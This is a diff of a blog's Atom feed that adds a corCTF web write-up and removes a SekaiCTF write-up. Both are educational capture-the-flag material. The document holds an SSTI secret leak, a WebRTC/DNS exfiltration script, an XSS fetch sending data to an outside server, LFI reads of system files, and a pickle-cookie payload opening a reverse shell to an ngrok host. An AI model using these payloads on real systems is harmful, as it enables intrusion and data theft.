@@ -1,4 +1,122 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-07-28T12:35:14+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">AmateursCTF Web Writeup</title><link href="https://www.cjxol.com/posts/amateursctf-web-writeup/" rel="alternate" type="text/html" title="AmateursCTF Web Writeup" /><published>2023-07-25T00:00:00+01:00</published><updated>2023-07-25T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/amateursctf-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/amateursctf-web-writeup/"><![CDATA[<p><a href="https://ctf.amateurs.team/">AmateursCTF</a><br />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-08-02T01:02:42+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">corCTF 2023 web/crabspace Writeup</title><link href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/" rel="alternate" type="text/html" title="corCTF 2023 web/crabspace Writeup" /><published>2023-08-01T00:00:00+01:00</published><updated>2023-08-01T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/"><![CDATA[<p><a href="https://2023.cor.team/challs">corCTF</a><br />
+<a href="https://ctftime.org/event/1928">Event on CTFtime</a></p>
+
+<p>It was a team effort for us to solve this challenge. I learned something new about WebRTC.</p>
+
+<h2 id="solution-summary">Solution summary</h2>
+
+<ul>
+  <li>SSTI in <code class="highlighter-rouge">Tera::one_off</code> to leak secret</li>
+  <li>WebRTC to bypass CSP restrictions and exfiltrate admin user id</li>
+  <li>Forge admin cookie with admin user id and secret to gain access to admin view</li>
+  <li>Follow admin account and sort following accounts on password field to leak admin password (which is the flag)</li>
+</ul>
+
+<h2 id="crabspace">crabspace</h2>
+
+<ul>
+  <li>Description:
+    <blockquote>
+      <p>Now that Twitter is 🦀 gone 🦀, it’s time for a new social media platform.<br />
+  🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀</p>
+    </blockquote>
+  </li>
+  <li>Author: Strellic</li>
+</ul>
+
+<p>The source code is provided. I can create users, edit my “space”, view other users’ “space”s, and follow other users.</p>
+
+<p><img src="/assets/image/corctf-2023-crabspace-web-writeup/crabspace.png" alt="crabspace" /></p>
+
+<p>To view a user’s “space”, visit <code class="highlighter-rouge">/space/&lt;user id&gt;</code>, The user id is UUIDv4 generated when the user is created. The “space” content is rendered in an <code class="highlighter-rouge">iframe</code>, with the content in the <code class="highlighter-rouge">iframe</code>’s <code class="highlighter-rouge">srcdoc</code> attribute.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">sandbox=</span><span class="s">"allow-scripts"</span>
+<span class="na">srcdoc=</span><span class="s">"&lt;link rel='stylesheet' href='/public/axist.min.css' /&gt;{{ space }}"</span> <span class="na">class=</span><span class="s">"space"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p>With content in <code class="highlighter-rouge">srcdoc</code>, it is rendered as HTML in the <code class="highlighter-rouge">iframe</code> even it is escaped in the template, thus we have an easy(?) XSS.</p>
+
+<p>The users are defined as a struct as shown below and stored in a map.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">#[derive(Debug,</span> <span class="nd">Serialize,</span> <span class="nd">Clone)]</span>
+<span class="k">pub</span> <span class="k">struct</span> <span class="n">User</span> <span class="p">{</span>
+    <span class="k">pub</span> <span class="n">id</span><span class="p">:</span> <span class="n">Uuid</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">name</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">pass</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">following</span><span class="p">:</span> <span class="nb">Vec</span><span class="o">&lt;</span><span class="n">Uuid</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">followers</span><span class="p">:</span> <span class="nb">Vec</span><span class="o">&lt;</span><span class="n">Uuid</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">space</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The admin user with flag as the password, and a random ID is created on starting of the application.</p>
+
+<p>The bot first logs in as admin, then visit an URL we provide.</p>
+
+<h2 id="finding-ssti">Finding SSTI</h2>
+
+<p>Initially it was not clear how we can get the flag from what is obvious. While I was on the train I read the source code twice and with the help of <a href="https://docs.rs/tera/latest/tera/struct.Tera.html#method.one_off">documentation</a> I found the <code class="highlighter-rouge">one_off</code> function in Tera when rendering “space” page is a bit suspicious.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ctx</span><span class="py">.tera</span><span class="nf">.insert</span><span class="p">(</span>
+    <span class="s">"space"</span><span class="p">,</span>
+    <span class="o">&amp;</span><span class="nn">Tera</span><span class="p">::</span><span class="nf">one_off</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user</span><span class="py">.space</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="py">.tera</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span><span class="nf">.unwrap_or_else</span><span class="p">(|</span><span class="n">_</span><span class="p">|</span> <span class="n">user</span><span class="py">.space</span><span class="nf">.clone</span><span class="p">()),</span>
+<span class="p">);</span>
+<span class="n">ctx</span><span class="py">.tera</span><span class="nf">.insert</span><span class="p">(</span><span class="s">"id"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">id</span><span class="p">);</span>
+<span class="nn">utils</span><span class="p">::</span><span class="nf">render</span><span class="p">(</span><span class="n">tera</span><span class="p">,</span> <span class="s">"space.html"</span><span class="p">,</span> <span class="n">ctx</span><span class="py">.tera</span><span class="p">)</span><span class="nf">.into_response</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/assets/image/corctf-2023-crabspace-web-writeup/one-off.png" alt="one_off is used in the code." /></p>
+
+<p>The code takes the user’s “space” as template and renders it. Tera templates documentation can be found at <a href="https://tera.netlify.app/docs/#templates">https://tera.netlify.app/docs/#templates</a>.</p>
+
+<p>When I printed out the template context with <code class="highlighter-rouge">{{ __tera_context }}</code>, I got:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ "user": { "followers": [], "following": [], "id": "af787749-d532-4d37-94a6-2d6bc4201f63", "name": "lollol", "pass": "", "space": "{{ __tera_context }}" } }
+</code></pre></div></div>
+
+<p>The context includes the user struct, which includes the ID of the logged in user. However, the password is set to empty string when the context is created:</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span> <span class="o">=</span> <span class="n">USERS</span><span class="nf">.get</span><span class="p">(</span><span class="o">&amp;</span><span class="n">id</span><span class="p">)</span><span class="nf">.map</span><span class="p">(|</span><span class="n">v</span><span class="p">|</span> <span class="n">User</span> <span class="p">{</span>
+    <span class="n">pass</span><span class="p">:</span> <span class="s">""</span><span class="nf">.to_string</span><span class="p">(),</span>
+    <span class="o">..</span><span class="n">v</span><span class="nf">.clone</span><span class="p">()</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>We can use SSTI to leak the secret for session cookie with <code class="highlighter-rouge">{{ get_env(name="SECRET") }}</code>. With the secret and the user ID of admin, we can forge a session cookie to login as admin.</p>
+
+<h2 id="leak-admin-user-id">Leak admin user ID</h2>
+
+<p>With the SSIT which can render the user ID and XSS, leaking the admin user ID should be easy right? However, with the very strict fetch directive CSP below, we tried including fetch API, WebSocket, meta tag and JS redirect, form and DNS prefetch, but had no luck exfiltrating the data. I could not find any endpoint on within the challenge that I could use style-src to exfiltrate the data neither.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>default-src 'none'; style-src 'self'; script-src 'unsafe-inline'; frame-ancestors 'none'
+</code></pre></div></div>
+
+<p>I then reading through all non-fetch directives in CSP, and some research. While getting ready to go to bed, thinking about all the cases where a webpage makes request to server, WebRTC came to my mind (I have also noticed <a href="https://www.w3.org/TR/webrtc-nv-use-cases/">a very new TR about WebRTC</a>, which may or may not be related). As I do not know much about WebRTC, I put a message on our Discord channel before I went to bed.</p>
+
+<p>The next morning, I started with some WebRTC examples. The payload is limited to only 200 characters, with some trial and error, I managed to craft a minimal payload that would do DNS request for the STUN server I specify (the payload has been modified to be more readable):</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">a</span><span class="p">(){</span>
+    <span class="nx">c</span><span class="o">=</span><span class="p">{</span><span class="na">iceServers</span><span class="p">:[{</span><span class="na">urls</span><span class="p">:</span><span class="dl">"</span><span class="s2">stun:{{user.id}}.x.cjxol.com:1337</span><span class="dl">"</span><span class="p">}]}</span>
+    <span class="p">(</span><span class="nx">p</span><span class="o">=</span><span class="k">new</span> <span class="nx">RTCPeerConnection</span><span class="p">(</span><span class="nx">c</span><span class="p">)).</span><span class="nx">createDataChannel</span><span class="p">(</span><span class="dl">"</span><span class="s2">d</span><span class="dl">"</span><span class="p">)</span>
+    <span class="k">await</span> <span class="nx">p</span><span class="p">.</span><span class="nx">setLocalDescription</span><span class="p">()</span>
+<span class="p">}</span>
+<span class="nx">a</span><span class="p">();</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>The port does not matter, as we are exfiltrating through DNS request. The user ID is included in the hostname and sent through DNS request.</p>
+
+<h2 id="getting-the-flag">Getting the flag</h2>
+
+<p>The admin account has access to admin view for each user (except admin itself). The admin view has the lists of followers and followings of the user. The lists are sorted with field specified in the URL query parameter. It is possible to sort by password field using <code class="highlighter-rouge">?sort=pass</code>.</p>
+
+<p>We can have a main account to follow other users. We can then create a list of users with selected password, and follow them along with admin on our main account. The admin view for the main account will have the list of users sorted by password, and we can get the flag character by character. This can be scripted with preparing the whole following list and get one character each time we visit the admin view, or can script with binary search. (This is kinda pain to extract the flag, thanks to my teammate implemented the solution.)</p>
+
+<p>Got the flag 🦀:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>corctf{b3tter_name_th4n_x}
+</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[corCTF Event on CTFtime]]></summary></entry><entry><title type="html">AmateursCTF Web Writeup</title><link href="https://www.cjxol.com/posts/amateursctf-web-writeup/" rel="alternate" type="text/html" title="AmateursCTF Web Writeup" /><published>2023-07-25T00:00:00+01:00</published><updated>2023-07-25T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/amateursctf-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/amateursctf-web-writeup/"><![CDATA[<p><a href="https://ctf.amateurs.team/">AmateursCTF</a><br />
 <a href="https://ctftime.org/event/1983">Event on CTFtime</a></p>
 
 <p>3 web challenge writeups in this post:</p>
@@ -1337,201 +1455,4 @@ Also initialising the model with the given random seed is very important!
 <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://web:8080/flag</span><span class="dl">"</span><span class="p">)</span>
     <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
     <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://my-server.example.com/xss?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">data</span><span class="p">));</span>
-</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SekaiCTF 2022 Writeup</title><link href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" rel="alternate" type="text/html" title="SekaiCTF 2022 Writeup" /><published>2022-10-11T00:00:00+01:00</published><updated>2022-10-11T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/sekaictf-2022-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/sekaictf-2022-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
-
-<p>This is my writeup to web challenges “<a href="https://ctf.sekai.team/challenges#Bottle-Poem-29">Bottle Poem</a>”, “<a href="https://ctf.sekai.team/challenges#Issues-33">Issues</a>” and reverse challenge “<a href="https://ctf.sekai.team/challenges#Perfect-Match-X-treme-44">Perfect Match X-treme</a>” in <a href="https://ctf.sekai.team/">SekaiCTF 2022</a>. The official source code and solution provided by the challenge authors are here: <a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a>. I started doing the CTF when I joined a team halfway through the CTF. The exploits and skills involved in these 3 challenges in this writeup includes local file inclusion (LFI), unsafe deserialization and remote code execution (RCE), improper use of JWKS, open redirect, Unity game reversing and general/reversing tooling.</p>
-
-<p>On this page:</p>
-
-<ul>
-  <li><a href="#bottle-poem-web">Bottle Poem (Web) writeup</a></li>
-  <li><a href="#issues-web">Issues (Web) writeup</a></li>
-  <li><a href="#perfect-match-x-treme">Perfect Match X-treme (Reverse) writeup</a></li>
-</ul>
-
-<h2 id="bottle-poem-web">Bottle Poem (Web)</h2>
-
-<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-index.png" alt="Bottle Poem index page." /></p>
-
-<p>In the first webpage of the challenge, there are three links to “poems in the Bottle”.</p>
-
-<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-spring.png" alt="First poem in the Bottle." /></p>
-
-<p>Upon clicking the link, we noticed the value of the query parameter <code class="highlighter-rouge">id</code> appears to be the filename of the file to be shown. For example, the link “Spring” links to <code class="highlighter-rouge">http://bottle-poem.ctf.sekai.team/show?id=spring.txt</code>.</p>
-
-<h3 id="local-file-inclusion-and-leaking-source-code">Local File Inclusion and Leaking Source Code</h3>
-
-<p>Filename being passed into as query parameter smells like the recipe for local file inclusion (LFI). Though the challenge description states the flag is an executable, and we cannot just make the webpage to include and display the flag, we however can get more information exploiting LFI.</p>
-
-<p>To confirm LFI, we tried to pass <code class="highlighter-rouge">/etc/passwd</code> as value of <code class="highlighter-rouge">id</code> parameter, and we get content of <code class="highlighter-rouge">/etc/passwd</code> being returned.</p>
-
-<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-passwd.png" alt="/etc/passwd leaked." /></p>
-
-<p>From the HTTP header <code class="highlighter-rouge">server: WSGIServer/0.2 CPython/3.8.12</code>, I can tell the backend is in Python. Many Python webapps in CTFs would have a <code class="highlighter-rouge">app.py</code> file as the entry point of the apps, so I tried to see if the file exists in the directory of the poem files or the parent directory, which hopefully to be the webapp’s root.</p>
-
-<p>When I tried <code class="highlighter-rouge">../app.py</code>, instead of showing “No This Poems”, it showed “No!!!!”, which means <code class="highlighter-rouge">../app.py</code> file likely exists and the author prevents us from seeing it.</p>
-
-<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py-no.png" alt="../app.py but we cannot see it." /></p>
-
-<p>Trying with several different “files” known to normally exist on Linux, <code class="highlighter-rouge">/proc/self/cmdline</code> gave me the command runs the webapp <code class="highlighter-rouge">python3 -u /app/app.py</code>. This gave me the absolute location of <code class="highlighter-rouge">app.py</code> file.</p>
-
-<p><code class="highlighter-rouge">/app/app.py</code> worked around the restrictions when using relevant path and leaked the source code of the webapp.</p>
-
-<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py.png" alt="app.py" /></p>
-
-<p>From the source code, I can see the app used Bottle web framework.</p>
-
-<h3 id="admin-and-other-distractions">Admin? And Other Distractions</h3>
-
-<p>In the function for <code class="highlighter-rouge">/sign</code>, I can see the if we do not have a session prior we will be assigned a guest session, if we have an admin session, we will have a different template rendered.</p>
-
-<p>Without looking into the templates, I started just obtaining admin session. I leaked the secret for signing the cookies from <code class="highlighter-rouge">/app/config/secret.py</code>:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sekai</span> <span class="o">=</span> <span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span>
-</code></pre></div></div>
-
-<p>I then installed Bottle and used it to serve webpage that sets signed cookie with data <code class="highlighter-rouge">{"name": "admin"}</code> to obtain the admin cookie:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span>
-
-<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/hello'</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">hello</span><span class="p">():</span>
-    <span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">}</span>
-    <span class="n">response</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s">"name"</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s">"Hello World!"</span>
-
-<span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'localhost'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>The value of the admin cookie produced is <code class="highlighter-rouge">!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==</code>. I then set the cookie named <code class="highlighter-rouge">name</code> as this value, and visited <code class="highlighter-rouge">/sign</code>, however, the page shown to me was not impressive. It showed me “Hello, you are admin, but it’s useless.”</p>
-
-<p>I looked around both templates for guest and admin, which are located in <code class="highlighter-rouge">/app/views/</code>, and named <code class="highlighter-rouge">guest.html</code> and <code class="highlighter-rouge">admin.html</code> respectively. The template files are just HTML with template syntax tags. The two lines from those files appear the most interesting as they contains template variable tags:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello {{{name}}, what r u doing????
-Hello, you are {{name}}, but it’s useless.
-</code></pre></div></div>
-
-<p>I wondered if any server-side template injection (SSTI) possible here. However, it appeared the <code class="highlighter-rouge">name</code> variable passed into the template is from the session cookie’s <code class="highlighter-rouge">name</code>, and the templates only renders if the value to be “guest” or “admin”, and any other values would not work.</p>
-
-<h3 id="finding-the-exploit">Finding the Exploit</h3>
-
-<p>Bottle is a rather small framework, when I was looking into <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py">the source code of Bottle</a> to figure out how to forge the admin cookie, I noticed a deprecate warning at <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py#L1850">line 1850</a> about pickling of arbitrary objects into cookies. I did some search and find this rather old <a href="https://github.com/bottlepy/bottle/issues/900">issue</a> from 2016 regarding the security of using pickle to deserialize cookie values, which causes remote code execution (RCE).</p>
-
-<p>Our team crafted a similar payload as the cookie value based on this exploit and got the flag:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pickle</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">hmac</span>
-<span class="kn">import</span> <span class="nn">hashlib</span>
-
-<span class="k">class</span> <span class="nc">RCE</span><span class="p">:</span>
-    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"""
-            python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",16526));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
-        """</span>
-        <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,)</span>
-
-<span class="k">def</span> <span class="nf">gen_cookie</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
-    <span class="n">b64pld</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span>
-        <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span>
-            <span class="sa">b</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">,</span> <span class="n">b64pld</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span>
-        <span class="p">).</span><span class="n">digest</span><span class="p">()</span>
-    <span class="p">)</span>
-    <span class="k">return</span> <span class="sa">b</span><span class="s">'"!'</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"?"</span> <span class="o">+</span> <span class="n">b64pld</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span>
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="n">pickled</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">())</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">gen_cookie</span><span class="p">(</span><span class="n">pickled</span><span class="p">))</span>
-</code></pre></div></div>
-
-<h3 id="bottle-poem-conclusion">Bottle Poem Conclusion</h3>
-
-<p>In this challenge we exploited LFI to leak information including the source of the webapp, and use of insecure deprecated features of unsafe deserialization in the framework which leads to RCE.</p>
-
-<h2 id="issues-web">Issues (Web)</h2>
-
-<p>This challenge has a downloadable, which contains the source of the challenge. Examining the source, it has an <code class="highlighter-rouge">app.py</code> and an <code class="highlighter-rouge">api.py</code> file contains the most interesting part of the challenge. In <code class="highlighter-rouge">app.py</code>, it has a <code class="highlighter-rouge">/.well-known/jwks.json</code> endpoint which returns a pre-defined JSON Web Key Set (JWKS). The flag is in a text file, and <code class="highlighter-rouge">/api/flag</code> endpoint would return the content of the file. However, the flag api endpoint requires authorization to access.</p>
-
-<p>Looking into the authorization code, it checks bearer tokens in header. The token is a JSON Web Token (JWT), and the public key used to verify the token is from the issuer defined in JWT token, grabbed with <code class="highlighter-rouge">requests.get(url)</code>. Thus, we could use our own public and private key pair to sign the JWT, and point the issuer to somewhere we have control thus provides our own public key for the app to verify the token.</p>
-
-<p>Is it that easy though? Before getting the public key, it checks if the issuer is from <code class="highlighter-rouge">localhost:8080</code> with <code class="highlighter-rouge">urlparse(issuer).netloc</code>. With this check, we can no longer point the issuer to anything we want other than <code class="highlighter-rouge">localhost:8080</code>. I tried to exploit <code class="highlighter-rouge">urlparse</code> to bypass the restriction, however, it did not seem would work (though not relevant, during the research, I learned that <code class="highlighter-rouge">urlparse</code> has interesting behaviour when returning hostnames e.g. <a href="https://bugs.python.org/issue36338">this report on Python bug tracker</a>, and <a href="https://security.snyk.io/vuln/SNYK-JS-URLPARSE-2407759">Python has this issue as described in this CVE for the Node.js package too</a>).</p>
-
-<p>When I reviewed the challenge code again, I noticed the <code class="highlighter-rouge">/logout</code> endpoint has an redirect after clearing the session, which defaults to <code class="highlighter-rouge">home</code>, however it does not do any check on the <code class="highlighter-rouge">redirect</code> parameter if given, and would redirect to whatever is passed onto. This is vulnerable to open redirect. I used this open redirect endpoint to bypass the restriction on issuer, crafted issuer <code class="highlighter-rouge">http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a=</code>, which results in the app requests JWKS from my own server.</p>
-
-<h3 id="crafting-the-final-payload">Crafting the Final Payload</h3>
-
-<p>Generate RSA private and public key:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> rsa.private 512
-openssl rsa <span class="nt">-in</span> rsa.private <span class="nt">-out</span> rsa.public <span class="nt">-pubout</span> <span class="nt">-outform</span> PEM
-</code></pre></div></div>
-
-<p>Make <code class="highlighter-rouge">jwks.json</code> to be served with HTTP server:</p>
-
-<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
-    </span><span class="nl">"keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
-        </span><span class="p">{</span><span class="w">
-            </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
-            </span><span class="nl">"x5c"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
-                </span><span class="s2">"&lt;content of public key&gt;"</span><span class="w">
-            </span><span class="p">]</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-    </span><span class="p">]</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<p>Generate the admin token:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">jwt</span>
-
-<span class="n">private_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rsa.private'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
-
-<span class="k">print</span><span class="p">(</span><span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">'user'</span><span class="p">:</span> <span class="s">'admin'</span><span class="p">},</span> <span class="n">private_key</span><span class="p">,</span> <span class="s">'RS256'</span><span class="p">,</span> <span class="p">{</span><span class="s">'issuer'</span><span class="p">:</span> <span class="s">'http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a='</span><span class="p">})</span>
-</code></pre></div></div>
-
-<p>The token looks like this:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
-</code></pre></div></div>
-
-<p>Request <code class="highlighter-rouge">/api/flag</code> endpoint with the authorization header using the token:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
-</code></pre></div></div>
-
-<p>Get flag <code class="highlighter-rouge">SEKAI{v4l1d4t3_y0ur_i55u3r_plz}</code>.</p>
-
-<h3 id="issues-conclusion">Issues Conclusion</h3>
-
-<p>I exploited the use of JWKS and open redirect in the challenge.</p>
-
-<h2 id="perfect-match-x-treme">Perfect Match X-treme</h2>
-
-<p>This challenge has a downloadable, which contains a Unity game. The game looks similar to Perfect Match minigame in Fall Guys: Ultimate Knockout (<a href="https://youtu.be/edifg0uMzxU">https://youtu.be/edifg0uMzxU</a>). The gameplay is to remember the fruits the tiles corresponding to in each round, and stand on the tiles matching the fruit shown on the screen at the end of the round to progress into the next round.</p>
-
-<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-game.png" alt="Challenge screenshot." /></p>
-
-<p>However, in the third round of the challenge game, it always shows the SekaiCTF logo on the screen, and no tiles matches. Thus, we cannot finish the game through normal gameplay to finish the game.</p>
-
